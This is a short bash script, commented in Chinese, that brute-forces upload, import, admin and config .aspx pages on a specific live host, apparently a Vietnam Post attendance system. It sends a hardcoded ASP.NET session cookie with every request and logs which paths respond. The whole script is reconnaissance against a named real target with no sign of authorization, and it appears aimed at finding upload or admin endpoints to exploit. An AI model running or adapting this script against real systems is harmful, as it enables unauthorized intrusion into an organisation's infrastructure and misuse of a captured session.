#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 枚举Chamcong所有.aspx文件"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 常见aspx文件名
FILES=(
    "upload.aspx"
    "Upload.aspx"
    "FileUpload.aspx"
    "file_upload.aspx"
    "uploader.aspx"
    "import.aspx"
    "Import.aspx"
    "ImportFile.aspx"
    "admin.aspx"
    "Admin.aspx"
    "adminpanel.aspx"
    "manage.aspx"
    "manager.aspx"
    "default.aspx"
    "Default.aspx"
    "home.aspx"
    "Home.aspx"
    "config.aspx"
    "settings.aspx"
    "user.aspx"
    "users.aspx"
    "profile.aspx"
    "account.aspx"
    "edit.aspx"
    "update.aspx"
    "delete.aspx"
    "view.aspx"
    "list.aspx"
    "search.aspx"
)

# 常见目录
DIRS=(
    ""
    "admin"
    "Admin"
    "manager"
    "common"
    "includes"
    "upload"
    "files"
    "report"
)

for dir in "${DIRS[@]}"; do
    for file in "${FILES[@]}"; do
        if [ -z "$dir" ]; then
            url="${BASE}/${file}"
        else
            url="${BASE}/${dir}/${file}"
        fi
        
        code=$(curl -sk "$url" -H "Cookie: $COOKIE" -o /dev/null -w "%{http_code}" 2>&1)
        
        if [ "$code" == "200" ] || [ "$code" == "302" ] || [ "$code" == "500" ]; then
            echo "✅ [$code] $url"
        fi
    done
done | tee found_aspx_files.txt

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "发现的文件:"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
cat found_aspx_files.txt
